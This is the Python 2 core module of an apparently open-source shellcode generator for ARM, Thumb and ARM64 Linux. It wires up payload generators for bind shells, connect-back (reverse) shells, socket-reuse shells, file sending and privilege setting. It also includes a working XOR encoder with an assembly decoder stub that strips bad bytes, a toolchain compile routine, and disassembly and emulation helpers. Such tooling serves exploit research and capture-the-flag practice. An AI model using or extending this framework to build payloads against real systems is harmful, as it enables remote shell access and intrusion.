#!python
import os
import sys
import tempfile
from socket import ntohs
from struct import unpack, pack

__VERSION__ = '$0.0.13'
__AUTHOR__  = 'alex.park'

##########################################################
## Thumb Mode 
##########################################################
from shellcodes.thumb import chmod       as th_chmod
from shellcodes.thumb import dup         as th_dup
from shellcodes.thumb import sh          as th_sh
from shellcodes.thumb import dupsh       as th_dupsh
from shellcodes.thumb import bindshell   as th_bindshell
from shellcodes.thumb import listen      as th_listen
from shellcodes.thumb import acceptloop  as th_acceptloop
from shellcodes.thumb import connect     as th_connect
from shellcodes.thumb import connectback as th_connectback
from shellcodes.thumb import open_file   as th_open_file
from shellcodes.thumb import sendfile    as th_sendfile
from shellcodes.thumb import cat         as th_cat
from shellcodes.thumb import exit        as th_exit
from shellcodes.thumb import findpeer    as th_findpeer
from shellcodes.thumb import findpeersh  as th_findpeersh
from shellcodes.thumb import getdents    as th_getdents
from shellcodes.thumb import ls          as th_ls
from shellcodes.thumb import setreuid    as th_setreuid
from shellcodes.thumb import setregid    as th_setregid
from shellcodes.thumb import overwrite   as th_overwrite
from shellcodes.thumb import appendwrite as th_appendwrite
from shellcodes.thumb import read_from_stack as th_read_from_stack
from shellcodes.thumb import write_to_stack  as th_write_to_stack
from shellcodes.thumb import infinityloop    as th_infinityloop
from shellcodes.thumb import arm_to_thumb as th_arm_to_thumb

##########################################################
## ARM Mode
##########################################################
from shellcodes.arm import dup   as arm_dup
from shellcodes.arm import sh    as arm_sh
from shellcodes.arm import dupsh as arm_dupsh
from shellcodes.arm import connect   as arm_connect
from shellcodes.arm import connectback as arm_connectback
from shellcodes.arm import listen as arm_listen
from shellcodes.arm import acceptloop as arm_acceptloop
from shellcodes.arm import bindshell as arm_bindshell
from shellcodes.arm import thumb_to_arm as arm_thumb_to_arm
from shellcodes.arm import open_file as arm_open_file
from shellcodes.arm import cat  as arm_cat
from shellcodes.arm import sendfile as arm_sendfile
from shellcodes.arm import chmod as arm_chmod
from shellcodes.arm import exit as arm_exit
from shellcodes.arm import getdents    as arm_getdents
from shellcodes.arm import ls          as arm_ls
from shellcodes.arm import read_from_stack as arm_read_from_stack
from shellcodes.arm import write_to_stack  as arm_write_to_stack
from shellcodes.arm import overwrite as arm_overwrite
from shellcodes.arm import setreuid as arm_setreuid
from shellcodes.arm import setregid as arm_setregid
from shellcodes.arm import findpeer as arm_findpeer
from shellcodes.arm import findpeersh as arm_findpeersh

##########################################################
## ARM64 Mode
##########################################################
from shellcodes.arm64 import sh   as arm64_sh
from shellcodes.arm64 import dup  as arm64_dup
from shellcodes.arm64 import cat  as arm64_cat
from shellcodes.arm64 import exit as arm64_exit
from shellcodes.arm64 import dupsh as arm64_dupsh
from shellcodes.arm64 import setreuid as arm64_setreuid
from shellcodes.arm64 import setregid as arm64_setregid
from shellcodes.arm64 import sendfile as arm64_sendfile
from shellcodes.arm64 import open_file as arm64_open_file
from shellcodes.arm64 import connect   as arm64_connect
from shellcodes.arm64 import connectback as arm64_connectback
from shellcodes.arm64 import listen as arm64_listen
from shellcodes.arm64 import acceptloop as arm64_acceptloop
from shellcodes.arm64 import bindshell as arm64_bindshell
from shellcodes.arm64 import infinityloop as arm64_infinityloop
from shellcodes.arm64 import read_from_stack as arm64_read_from_stack
from shellcodes.arm64 import getdents    as arm64_getdents
from shellcodes.arm64 import ls          as arm64_ls
from shellcodes.arm64 import appendwrite as arm64_appendwrite
from shellcodes.arm64 import write_to_stack  as arm64_write_to_stack
from shellcodes.arm64 import overwrite as arm64_overwrite
from shellcodes.arm64 import fsync as arm64_fsync
from shellcodes.arm64 import lseek as arm64_lseek
from shellcodes.arm64 import findpeer as arm64_findpeer
from shellcodes.arm64 import findpeersh as arm64_findpeersh

class thumbSCGen:
    """Thumb Mode Shellcode Generator Class

    """
    def __init__(self):
        self.chmod           = th_chmod.generate
        self.dup             = th_dup.generate
        self.sh              = th_sh.generate
        self.sh_tc           = th_sh.testcase
        self.dupsh           = th_dupsh.generate
        self.bindshell       = th_bindshell.generate
        self.listen          = th_listen.generate
        self.acceptloop      = th_acceptloop.generate
        self.connect         = th_connect.generate
        self.connectback     = th_connectback.generate
        self.open_file       = th_open_file.generate
        self.sendfile        = th_sendfile.generate
        self.cat             = th_cat.generate
        self.exit            = th_exit.generate
        self.findpeer        = th_findpeer.generate
        self.findpeersh      = th_findpeersh.generate
        self.getdents        = th_getdents.generate
        self.ls              = th_ls.generate
        self.setreuid        = th_setreuid.generate
        self.setregid        = th_setregid.generate
        self.overwrite       = th_overwrite.generate
        self.appendwrite     = th_appendwrite.generate
        self.infinityloop    = th_infinityloop.generate
        self.arm_to_thumb    = th_arm_to_thumb.generate
        self.write_to_stack  = th_write_to_stack.generate
        self.read_from_stack = th_read_from_stack.generate
        prepareCompiler('THUMB')
        

class armSCGen:
    """ARM Mode Shellcode Generator Class

    """
    def __init__(self):
        self.dup             = arm_dup.generate
        self.sh              = arm_sh.generate
        self.dupsh           = arm_dupsh.generate
        self.connect         = arm_connect.generate
        self.connectback     = arm_connectback.generate
        self.listen          = arm_listen.generate
        self.acceptloop      = arm_acceptloop.generate
        self.bindshell       = arm_bindshell.generate
        self.thumb_to_arm    = arm_thumb_to_arm.generate
        self.open_file       = arm_open_file.generate
        self.sendfile        = arm_sendfile.generate
        self.cat             = arm_cat.generate
        self.chmod           = arm_chmod.generate
        self.exit            = arm_exit.generate
        self.getdents        = arm_getdents.generate
        self.ls              = arm_ls.generate
        self.overwrite       = arm_overwrite.generate
        self.setreuid        = arm_setreuid.generate
        self.setregid        = arm_setregid.generate
        self.findpeer        = arm_findpeer.generate
        self.findpeersh      = arm_findpeersh.generate
        self.write_to_stack  = arm_write_to_stack.generate
        self.read_from_stack = arm_read_from_stack.generate
        prepareCompiler('ARM')

class arm64SCGen:
    """ARM64 Mode Shellcode Generator Class

    """
    def __init__(self):
        self.sh              = arm64_sh.generate
        self.dup             = arm64_dup.generate
        self.cat             = arm64_cat.generate
        self.exit            = arm64_exit.generate
        self.dupsh           = arm64_dupsh.generate
        self.setreuid        = arm64_setreuid.generate
        self.setregid        = arm64_setregid.generate
        self.sendfile        = arm64_sendfile.generate
        self.open_file       = arm64_open_file.generate
        self.connect         = arm64_connect.generate
        self.connectback     = arm64_connectback.generate
        self.listen          = arm64_listen.generate
        self.acceptloop      = arm64_acceptloop.generate
        self.bindshell       = arm64_bindshell.generate
        self.infinityloop    = arm64_infinityloop.generate
        self.getdents        = arm64_getdents.generate
        self.ls              = arm64_ls.generate
        self.overwrite       = arm64_overwrite.generate
        self.appendwrite     = arm64_appendwrite.generate
        self.fsync           = arm64_fsync.generate
        self.lseek           = arm64_lseek.generate
        self.findpeer        = arm64_findpeer.generate
        self.findpeersh      = arm64_findpeersh.generate
        self.write_to_stack  = arm64_write_to_stack.generate
        self.read_from_stack = arm64_read_from_stack.generate
        prepareCompiler('ARM64')

# Assembler 
BIN_AS32 = '/usr/bin/arm-linux-gnueabi-as'
BIN_AS64 = '/usr/bin/aarch64-linux-gnu-as'
ALTER_BIN_AS = 'as'
# Linker
BIN_LD32 = '/usr/bin/arm-linux-gnueabi-ld'
BIN_LD64 = '/usr/bin/aarch64-linux-gnu-ld'
ALTER_BIN_LD = 'ld'
# Objcopy
BIN_OC32 = '/usr/bin/arm-linux-gnueabi-objcopy'
BIN_OC64 = '/usr/bin/aarch64-linux-gnu-objcopy'
ALTER_BIN_OC = 'objcopy'
# Empty 
BIN_AS = ''
BIN_LD = ''
BIN_OC = ''

# RAW Shellcode
RAW_SC = 'raw_sc'

# capstone available
g_capstone = False
try:
    from capstone import *
    from capstone.arm import *
    g_capstone = True
except ImportError:
    #SYSERR("There is no capstone library for disassembling")
    g_capstone = False
except:
    SYSERR("Exception: Unknown in disasm(...)")

# unicorn engine available
g_unicorn = False
try:
    from unicorn import *
    from unicorn.arm_const import *
    g_unicorn = True
except ImportError:
    g_unicorn = False
except:
    SYSERR("Exception: Unknown error - import unicorn")

g_runEmuCnt = -1
g_sclen = -1
g_debug = False
g_regs = []

def SYSERR(m):
    """SYSERR(m) -> None

    Print syserr(2) screen to debug

    Args:
        m(fmt): message will be printed on syserr screen

    """
    print >> sys.stderr, "%s" % (m)

def cleanup(fn):
    """clean up compiled files

    Args:
        fn(list): files in list will be deleted

    """
    for f in fn:
        if os.path.exists(f) == True:
            try:
                os.unlink(f)
            except:
                pass

def prepareCompiler(mode='THUMB'):
    """prepares some PATH to compile safely

    """
    global BIN_AS
    global BIN_LD
    global BIN_OC

    if (mode == 'THUMB') or (mode == 'ARM'):
        if os.path.exists(BIN_AS32) == False:
            BIN_AS = ALTER_BIN_AS
        else:
            BIN_AS = BIN_AS32

        if os.path.exists(BIN_LD32) == False:
            BIN_LD = ALTER_BIN_LD
        else:
            BIN_LD = BIN_LD32

        if os.path.exists(BIN_OC32) == False:
            BIN_OC = ALTER_BIN_OC
        else:
            BIN_OC = BIN_OC32
    elif mode == 'ARM64':
        if os.path.exists(BIN_AS64) == False:
            BIN_AS = ALTER_BIN_AS
        else:
            BIN_AS = BIN_AS64

        if os.path.exists(BIN_LD64) == False:
            BIN_LD = ALTER_BIN_LD
        else:
            BIN_LD = BIN_LD64

        if os.path.exists(BIN_OC64) == False:
            BIN_OC = ALTER_BIN_OC
        else:
            BIN_OC = BIN_OC64
    else:
        SYSERR("Not Implemented yet")

def CompileSC(source, isThumb=False, isNeedHead=True):
    """Compiles shellcode

    Args:
        source (str): shellcode in strings

        isThumb (boolean): Thumb or ARM Mode

        isNeedHead (boolean): It shows up if true


    Returns:
      compiled shellcode 

    """
    ASM_HEAD = """
    .global _start
    .section .text
    _start:
    """

    ASM_THUMB = """
    .arm
    add r6, pc, #1
    bx r6
    .thumb
    """

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy 
    will_be_deleted = [fn, fn_s, fn_o, fn_raw]

    src = ''
    if isNeedHead:
        src += ASM_HEAD + '\n'

    #if isThumb:
    #    src += ASM_THUMB + '\n'

    src += source
    # write a source
    open(fn_s, 'w').write(src)

    # compile a source
    if isThumb:
        COMPILE = '%s %s -o %s -mthumb' % (BIN_AS, fn_s, fn_o)
    else:
        COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
    os.system(COMPILE)
    if os.path.exists(fn_o) == False:
        print "Failed to compile a source: %s" % (fn_s)
        cleanup(will_be_deleted)
        return ""

    # link an object
    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
    os.system(LINKING)
    if os.path.exists(fn_o) == False:
        print "Failed to link an object: %s" % (fn_o)
        cleanup(will_be_deleted)
        return ""

    # objcopy 
    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
    os.system(OBJCOPY)
    if os.path.exists(fn_raw) == False:
        print "Failed to make a raw file: %s" % (fn)
        cleanup(will_be_deleted)
        return ""

    f = open(fn_raw,'rb').read()
    cleanup(will_be_deleted)

    return f

def printHex(xhex):
    """print hex code in human-readable

    Args:
        xhex(hex): hex code

    Returns:
        human-readable hex code like '\\x41'

    """
    xtmp = ''
    xhex = xhex.encode('hex')
    for x in range(0, len(xhex), 2):
        xtmp += '\\x' + xhex[x:x+2]

    return xtmp

def XOREncoder(scSize, xorkey, SC):
    """XOR Encoder to avoid some bad codes like ``0x0a``, ``0x00`` and so on

    Args:
        scSize(int): shellcode length

        xorkey(int): XOR key

        SC(str): shellcode

    Returns:
        XOR Encoder shellcode in string

    """
    MAX_SC_SIZE = 256
    LOOP_SC_SIZE = MAX_SC_SIZE - scSize

    sc="""
    adr r8, scode

main:
    mov r4, #%s
    adr r6, nanosleep

loop:
    cmp  r4, #%s
    bxhi r6
    sub  r4, r4, #%s
    ldrb r5, [r8, r4]
    eor  r5, r5, #%s
    strb r5, [r8, r4]
    add  r4, r4, #%s

backloop:
    b loop
backmain:
    bl main

nanosleep:
    .arm
    add r6, pc, #1
    bx r6
    .thumb
nanosleep2:
    sub r5, r5, r5
    add r5, r5, #1
    sub r6, r6, r6
    push {r5, r6}
    push {r5, r6}
    mov r0, sp
    mov r1, sp
    mov r7, #162
    svc 1

scode:
    .asciz "%s"
    """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xorkey, LOOP_SC_SIZE+1, printHex(SC))

    return sc

def findXorKey(sc, bc=['\x00', '\x0a']):
    """find XOR key to scramble and to avoid all of bad chars such as ``0x00``

        Args:
            sc(str): shellcode

            bc(list): bad chars to avoid

        Returns:
            key (int): XOR key

        Examples:
            >>> print findXorKey(sc)
            2
    """
    size = len(sc)
    bcs  = bc
    for i in range(0x01, 0xFF+1):
        key = i
        for s in sc:
            x = (ord(s) ^ i)
            if chr(x) in bcs:
                key = -1
                break
        if key != -1:
            return key
    return -1


def encodeShellcode(sc, key):
    """encodes shellcode with key to avoid all of bad chars such as ``0x00``

        Args:
            sc(str): shellcode
            key(int/str): XOR key

        Returns:
            xoredSC(str): XORed Shellcode

        Examples:
            >>> print encodeShellcode(sc, findXorKey(sc))
            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
    """

    xsc = ''
    for i in range(0, len(sc)):
        xsc += chr( ord(sc[i]) ^ key )
    
    return xsc

def checkBadChar(sc, bc=[0x00, 0x0a]):
    """checks bad chars in shellcode string

    Args:
        sc(str): shellcode

        bc(list): bad chars like ``0x00``, ``0x0a``

    Returns:
        list if bad chars exists
    """

    from collections import defaultdict
    bcs = defaultdict(int)
    size = len(sc)
    for s in sc:
        if s in bc:
            bcs[s] += 1

    return bcs

def MakeXorShellcode(sc, isThumb=False):
    """Make XOR Encoder with Shellcode

    Args:
        sc(str): shellcode

        isThumb(boolean): ARM or Thumb Mode

    Returns:
        shellcode in hex

    Examples:
        >>> sc = MakeXorShellcode(bindshell, isThumb=True)

    """
    key = findXorKey(sc)
    if key == -1:
        SYSERR("Failed to find xor key")
        return ""

    xorsc  = encodeShellcode(sc, key)
    xorenc = XOREncoder(len(xorsc), key, xorsc)
    rv = checkBadChar(xorenc)
    if len(rv) != 0:
        SYSERR("!!! Bad char has been found in shellcode. Please check out")
        return ""

    return CompileSC(xorenc, isThumb=isThumb)

def uu16(u):
    """struct.unpack(2-bytes)

    Args:
        u(str): 2-bytes packed data

    Returns:
        unsigned short value

    """
    return unpack('<H', u)[0]

def u16(u):
    """struct.unpack(2-bytes)

    Args:
        u(str): 2-bytes packed data

    Returns:
        short value

    """
    return unpack('<h', u)[0]

def uu32(u):
    """struct.unpack(4-bytes)

    Args:
        u(str): 4-bytes packed data

    Returns:
        unsigned integer value

    """
    return unpack('<I', u)[0]

def u32(u):
    """struct.unpack(4-bytes)

    Args:
        u(str): 4-bytes packed data

    Returns:
        integer value

    """
    return unpack('<i', u)[0]


def getdent_to_list(rv):
    """parses getdent's struct to human readable.
    
       Args: 
            rv(str): getdent's struct included file/directory name(s)
            
       Returns:
            fn(list): file/directory name(s)
    """
    i  = 0
    fn = []
    try:
        while 1:
            inode   = rv[i:i+4]
            off     = rv[i+4:i+8]
            st_size = u16(rv[i+8:i+10])
            fname   = rv[i+10:i+st_size]

            if st_size == 0:
                break
            xfname = fname.split('\x00')[0]

            if len(xfname) != 0:
                fn.append(xfname)
            i = i + st_size
            if i == len(rv):
                break
            if i > len(rv):
                # weird but have to exit
                break
    except:
        return fn.append('exception')

    return fn

def thumb_fixup(reg, value):
    """fixes up value for register 

       Args:
            reg(str): register

            value(int): real value

       Retruns:
            fn(str): arranged value with register
    """
    if value <= 255:
        return "\tmov %s, #%s" % (reg, value)

    fn = []
    fn.append('\tsub %s, %s, %s' % (reg, reg, reg))
    mod = value % 255
    div = value / 255

    for v in range(0, div):
        fn.append('\tadd %s, %s, #255' % (reg, reg))
    fn.append('\tadd %s, %s, #%s' % (reg, reg, mod))

    return '\n'.join(fn)

def disasm(code, arch='ARM', mode='THUMB'):
    """disassembles code in arch with mode

    Args:
        code(str): assemble code

        arch(str): Architechture (so far ARM only)

        mode(str): Mode (THUMB or ARM)

    Returns:
        result in string

    Examples:
        >>> rv = disasm(code, 'ARM', 'THUMB')
    """

    if g_capstone == False:
        SYSERR("so far, there is no capstone module")
        return

    if arch == 'ARM':
        xarch = CS_ARCH_ARM
    elif arch == 'ARM64':
        xarch = CS_ARCH_ARM64
    else:
        SYSERR("Not implemented yet")
        return ""

    if mode == 'THUMB':
        xmode = CS_MODE_THUMB
    else:  
        xmode = CS_MODE_ARM

    md = Cs(xarch, xmode)
    md.detail = True

    totalSize = 0
    dat = ''
    for i in md.disasm(code, 0x0000):
        #if i.id in (ARM_INS_BL, ARM_INS_CMP):
        if i.size == 4:
            s = "%08x" % uu32(i.bytes)
        elif i.size == 2:
            s = "%04x" % uu16(i.bytes)
        else:
            s = "-1"

        dat += "0x%08x (%04d): %-8s %-8s %s\n" %(i.address, totalSize, s, i.mnemonic, i.op_str)
        totalSize += i.size    

    return dat

####################
# code from scgen.py
####################
def isScode(s, sname):
    thgen    = thumbSCGen()
    armgen   = armSCGen()
    arm64gen = arm64SCGen()    

    d = {}
    rv = {}
    for v in dir(s):
        if len(v) == 0:
            continue
        if v[:2] == '__':
            continue
        d[v] = (eval("%s.%s" % (sname, v)))
    rv[sname] = d
    return rv


def getShellcodeInfo(arch='thumb'):
    thgen    = thumbSCGen()
    armgen   = armSCGen()
    arm64gen = arm64SCGen()    

    scs = []
    scs.append(isScode(thgen,    'thgen'))
    scs.append(isScode(armgen,   'armgen'))
    scs.append(isScode(arm64gen, 'arm64gen'))

    _scname = ''
    xscname = {'thgen':'thumb', 'armgen':'arm', 'arm64gen':'arm64'}

    for i in range(0, len(scs)):
        scname = scs[i].keys()[0]
        _scname = xscname[scname]
        if _scname != arch:
            continue
                
        sckeys = scs[i][scname].keys()
        sckeys.sort()
        return sckeys

    return -1

def getShellcodeHelp(scode, arch='thumb'):
    thgen    = thumbSCGen()
    armgen   = armSCGen()
    arm64gen = arm64SCGen()    
    try:
        if arch == 'arm':
            show = eval("armgen.%s.__doc__" % (scode))
        elif arch == 'arm64':
            show = eval("arm64gen.%s.__doc__" % (scode))
        elif arch == 'thumb':
            show = eval("thgen.%s.__doc__" % (scode))
    except AttributeError:
        show = "There is no '%s' shellcode so far" % (scode)
    except:
        show = "Unknown execption"

    return show

# UC code
# callback for tracing instructions
def hook_code(uc, address, size, user_data):
    # read this instruction code from memory
    global g_runEmuCnt
    tmp = uc.mem_read(address, size)
    if g_debug:
        print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" %(address, size))
        print(">>> Instruction code at [0x%x] =" %(address))

    g_runEmuCnt += size

# callback for tracing basic blocks
def hook_block(uc, address, size, user_data):
    if g_debug:
        print(">>> Tracing basic block at 0x%x, block size = 0x%x" %(address, size))

# callback for tracing Linux interrupt
def hook_intr(uc, intno, user_data):
    global g_regs 

    regs = REGS()
    regs.r0 = uc.reg_read(UC_ARM_REG_R0)
    regs.r1 = uc.reg_read(UC_ARM_REG_R1)
    regs.r2 = uc.reg_read(UC_ARM_REG_R2)
    regs.r3 = uc.reg_read(UC_ARM_REG_R3)
    regs.r4 = uc.reg_read(UC_ARM_REG_R4)
    regs.r5 = uc.reg_read(UC_ARM_REG_R5)
    regs.r6 = uc.reg_read(UC_ARM_REG_R6)
    regs.r7 = uc.reg_read(UC_ARM_REG_R7)
    g_regs.append(regs)

    if g_runEmuCnt >= g_sclen:
        uc.emu_stop()
    return

class REGS:
    r0 = 0
    r1 = 0
    r2 = 0
    r3 = 0
    r4 = 0
    r5 = 0
    r6 = 0
    r7 = 0

def UC_TESTSC(code, scsize, arch=0, mode=0, isDebug=True):
    if g_unicorn == False:
        return 0

    START_RIP = 0x0
    PAGE_SIZE = 5 * 1024 * 1024

    global g_runEmuCnt
    global g_sclen
    global g_debug
    global g_regs

    g_runEmuCnt = 0
    g_sclen = scsize
    g_debug = isDebug
    g_regs = []

    try:
        mu = Uc(arch, mode)
        # 5MB memory
        mu.mem_map(START_RIP, PAGE_SIZE)
        # write code in memory
        mu.mem_write(START_RIP, code)
        # initialize machine registers
        mu.reg_write(UC_ARM_REG_SP, 0x2000)

        mu.hook_add(UC_HOOK_BLOCK, hook_block)
        mu.hook_add(UC_HOOK_CODE, hook_code)

        mu.hook_add(UC_HOOK_INTR, hook_intr)
        mu.emu_start(START_RIP, scsize, 0, 0x2000)

        return g_regs
    except UcError as e:
        print("ERROR: %s" % e)
        return -1
